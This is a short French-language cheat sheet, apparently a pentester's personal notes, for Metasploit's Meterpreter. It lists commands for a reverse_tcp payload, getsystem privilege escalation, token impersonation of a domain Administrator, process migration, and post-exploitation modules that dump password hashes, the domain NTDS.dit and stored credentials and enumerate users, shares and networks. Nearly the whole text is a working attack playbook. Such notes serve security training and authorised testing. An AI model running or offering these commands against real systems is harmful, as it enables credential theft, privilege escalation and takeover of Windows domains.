# Meterpreter
From cmd, bash, netcat ou ssh to meterprer: sessions -u <shell dans metasploit>


## lancer un explot avec meterpreter 64bits:
set payload windows/x64/meterpreter/reverse_tcp


## commands:
getuid
use priv
getsystem
sysinfo
run  post/windows/gather/win_privs


## process:
ps
migrate <pid>
getpid
run post/windows/manage/migrate


## fichier:
upload
download

## Tokens
use incognito #(recuperer les tokens sur le systeme)
list_tokens -u
impersonate_token SNEAKS.IN\\Administrator
getuid
shell

## kerberos:
kerberos_ticket_list

## Autres exploits

background

use exploit/windows/local/ 


#revenir à la session
sessions -i 1

run post/windows/gather/hashdump #dump de creds
run post/windows/gather/credentials/domain_hashdump #dump NTDIS.dit
run post/windows/gather/enum_snmp
run post/windows/gather/usb_history 
run post/windows/gather/enum_shares
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/dumplinks
run post/windows/manage/migrate
run post/windows/gather/credentials/credential_collector #excellent
run post/windows/gather/checkvm
run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
run post/windows/gather/credentials/gpp
run post/windows/gather/credentials/windows_autologin 

## excellent:
use post/multi/recon/local_exploit_suggester


## powershell:
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_
powershell_execute  powershell_import   powershell_shell    
meterpreter > powershell_shell
PS > ls


## à test: 
run post/windows/gather/bloodhound


